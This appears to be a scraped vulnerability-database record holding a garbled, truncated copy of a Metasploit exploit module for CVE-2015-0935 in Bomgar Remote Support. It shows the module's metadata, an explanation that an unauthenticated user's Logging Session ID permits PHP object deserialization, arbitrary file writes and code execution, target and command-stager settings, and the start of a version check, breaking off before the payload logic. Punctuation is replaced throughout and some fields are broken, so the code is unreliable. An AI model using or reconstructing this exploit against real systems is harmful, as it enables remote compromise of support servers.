{
    "text": "vul_name : Bomgar Remote Support Unauthenticated Code Execution ， vul_cve : CVE-2015-0935 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， def initialize ， super (  ， 'Name' => 'Bomgar Remote Support Unauthenticated Code Execution' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the Bomgar Remote Support , which ， deserializes user provided data using PHP's `unserialize` method. ， By providing an specially crafted PHP serialized object , it is possible ， to write arbitrary data to arbitrary files. This effectively allows the ， execution of arbitrary PHP code in the context of the Bomgar Remote Support ， system user. ， To exploit the vulnerability , a valid Logging Session ID ( LSID ) is required. ， It consists of four key-value pairs ( i. e. , 'h= [ . ]  ; l= [ . ]  ; m= [ . ]  ; t= [ . ] ' )  ， and can be retrieved by an unauthenticated user at the end of the process ， of submitting a new issue via the 'Issue Submission' form. ， Versions before 15.1.1 are reported to be vulnerable. ， } ,  ， 'Author' => ，  [  ， 'Markus Wulftange' ,  ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'DisclosureDate' => 'May 5 2015' ,  ， ' ，  [  ，  [ 'CWE' , '94' ]  ,  ，  [ 'CWE' , '502' ]  ,  ，  [ 'CVE' , '2015-0935' ]  ,  ，  [ 'US-CERT-VU' , '978652' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => false ,  ， 'Targets' => ，  [  ，  [ 'Linux x86' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => ARCH_X86 ,  ， 'CmdStagerFlavor' => [  : echo ,  : printf ]  ， } ，  ]  ,  ，  [ 'Linux x86_64' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => ARCH_X86_64 ,  ， 'CmdStagerFlavor' => [  : echo ,  : printf ]  ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => ， { ， 'RPORT' => 443 ,  ， 'SSL' => true ,  ， 'TARGETURI' => '/session_complete' ,  ， } ,  ， register_options (  ，  [  ， OptString.new ( 'LSID' ,  [ true , 'Logging Session ID' ]  )  ,  ，  ]  , self.class ， end ， def check ， version = detect_version ， print_status ( \"Version # {version} detected\" ) ",
    "time": "2016.06.16"
}